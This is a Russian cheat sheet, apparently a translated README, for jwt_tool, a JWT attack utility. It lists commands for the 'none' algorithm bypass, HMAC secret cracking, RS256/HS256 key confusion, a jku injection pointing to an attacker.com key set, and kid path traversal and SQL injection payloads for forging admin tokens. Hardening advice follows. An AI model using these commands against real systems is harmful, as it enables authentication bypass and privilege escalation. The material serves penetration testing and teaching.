<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪙 jwt_tool — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
       ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
       ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
       ██║██║ █╗ ██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ██   ██║██║███╗██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ╚█████╔╝╚███╔███╔╝   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
        All-in-One JSON Web Token Manipulation & Exploitation Suite
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/jwt__tool-Token_Exploitation-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Author-ticarpi-orange?style=for-the-badge" alt="ticarpi">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Веб-безопасность">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p выравнивание="центр">
  <b>🪙 Мощный набор инструментов Python CLI для анализа, подделки, сканирования и взлома веб-токенов JSON (JWT)</b>
</p>

---

## 📋 Содержание

- [Обзор и анатомия JWT](#-overview--jwt-anatomy)
- [Установка](#-установка)
- [Разбор и проверка токенов](#-token-parsing--inspection)
- [Автоматическое сканирование уязвимостей (`-M at`)](#-automated-vulnerability-scanning--m-at)
- [Общие сценарии эксплуатации](#-common-exploitation-scenarios)
  - [Спутанность алгоритма / Нет атаки (`none`)](#algorithm-confusion--none-attack-none)
  - [Взлом секретного ключа HMAC](#hmac-secret-key-cracking)
  - [Спутанность ключей: от RS256 до HS256 с открытым ключом](#key-confusion-rs256-to-hs256-with-public-key)
  - [Внедрение заголовка: подмена JKU, X5U и JWK](#header-injection-jku-x5u--jwk-spoofing)
  - [KID-инъекция (SQLi и обход пути)](#kid-injection-sqli--path-traversal)
- [Заявления о фальсификации полезной нагрузки и подделке](#-payload-tampering--forging-claims)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и усиление](#-защитные-соображения--укрепление)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и анатомия JWT

Веб-токен JSON (RFC 7519) состоит из трех сегментов в кодировке Base64URL, разделенных точками (`.`):
`header.payload.signature`

1. **Заголовок:** идентифицирует тип токена (`typ`) и алгоритм подписи (`alg`, например, `HS256`, `RS256`, `none`).
2. **Полезные данные:** Содержит утверждения пользователей (`sub`, `role`, `admin`, `exp`).
3. **Подпись:** хэш криптографической проверки, предотвращающий несанкционированное вмешательство на стороне клиента.

**jwt_tool**, созданный **ticarpi**, автоматизирует тестирование ошибок архитектуры и реализации в рабочих процессах аутентификации JWT в API и современных веб-приложениях.

---

## 📥 Установка
```bash
# Clone the repository
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Install dependencies
pip install -r requirements.txt

# Run jwt_tool
python3 jwt_tool.py --help
```
---

## 🔍 Анализ и проверка токенов

Декодируйте и проверьте параметры заголовка и утверждения полезной нагрузки:
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
```
---

## ⚡ Автоматическое сканирование уязвимостей (`-M at`)

Запустите автоматическое сканирование плейбуков, проверяющее известные уязвимости целевой веб-службы:
```bash
# Run All Tests (-M at) sending requests to web endpoint
python3 jwt_tool.py <JWT_TOKEN> \
  -M at \
  -u "https://api.target.com/user/profile" \
  -rh "Authorization: Bearer <JWT_TOKEN>"
```
*Выполнено тестов:*
- Снятие подписи (нет вариантов алгоритма)
- Путаница ключей RSA и HMAC.
- Подделка претензий (`admin=true`, повышение привилегий)
- Впрыск в заголовки `kid`, `jku`, `x5u`
- Обработка пустой подписи.

---

## 💥 Распространенные сценарии эксплуатации

### Путаница алгоритма / Нет атаки (`none`)
Когда реализации серверной части принимают неподписанные токены:
```bash
# Forge token with 'none' algorithm and stripped signature
python3 jwt_tool.py <JWT_TOKEN> -X a
```
*Варианты тестируются автоматически:* `none`, `None`, `NONE`, `nOnE`.

### Взлом секретного ключа HMAC
Когда HS256/HS384/HS512 использует слабую парольную фразу:
```bash
# Dictionary attack using rockyou.txt
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```
### Путаница с ключами: RS256–HS256 с открытым ключом
Если сервер подписывает RSA (RS256), но принимает HMAC (HS256), используя свой открытый сертификат в качестве общего ключа HMAC:
```bash
# Forge token using server public key file
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
```
### Внедрение заголовка: подмена JKU, X5U и JWK
Внедрение ключей или URL-адресов, контролируемых злоумышленником:
```bash
# Inject attacker-controlled JWKS URL in jku header
python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json" -S hs256 -k secret
```
### KID-инъекция (SQLi и обход пути)
Если серверная часть использует параметр заголовка `kid` (Key ID) непосредственно в запросах к базе данных или путях к файлам:
```bash
# Path traversal pointing to /dev/null (empty secret)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# SQL Injection in kid header to bypass signature verification
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'my_secret'--" -S hs256 -p "my_secret"
```
---

## ✍️ Претензии о фальсификации и подделке полезной нагрузки

Измените определенные значения утверждений и отмените токен:
```bash
# Change claim 'admin' to true and 'role' to 'SuperAdmin' using known secret
python3 jwt_tool.py <JWT_TOKEN> \
  -T \
  -pc "admin" -pv "true" \
  -pc "role" -pv "SuperAdmin" \
  -k "secret_key"
```
---

## ⚡ Краткая справочная таблица

| Цель | Команда |
|-----------|---------|
| **Декодирование и анализ токена** | `python3 jwt_tool.py <JWT>` |
| **Комплексное сканирование сборника игр** | `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
| **Взломать секрет HMAC** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
| **Обход без алгоритма** | `python3 jwt_tool.py <JWT> -X a` |
| **RS256 -> Путаница HS256** | `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
| **Тамперная полезная нагрузка и подпись** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
| **Обход пути KID** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |

---

## 🛡️ Соображения по защите и закалке

1. **Строгий белый список алгоритмов:** Никогда не принимайте `none` или переключение алгоритма. Явно проверяйте ожидаемые алгоритмы (только `RS256`).
2. **Отклонять ключи, управляемые клиентом.** Не доверяйте слепо заголовкам `jku`, `jwk` или `x5u` из ненадежных входных данных без строгих списков разрешенных доменов.
3. **Используйте надежные секреты.** Убедитесь, что ключи HMAC состоят как минимум из 256 бит случайных криптографических байтов с высокой энтропией.

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> jwt_tool предназначен исключительно для авторизованного тестирования на проникновение, оценки уязвимостей API и образовательных исследований. Подделка токенов для доступа к неавторизованным системам без письменного разрешения строго противозаконна.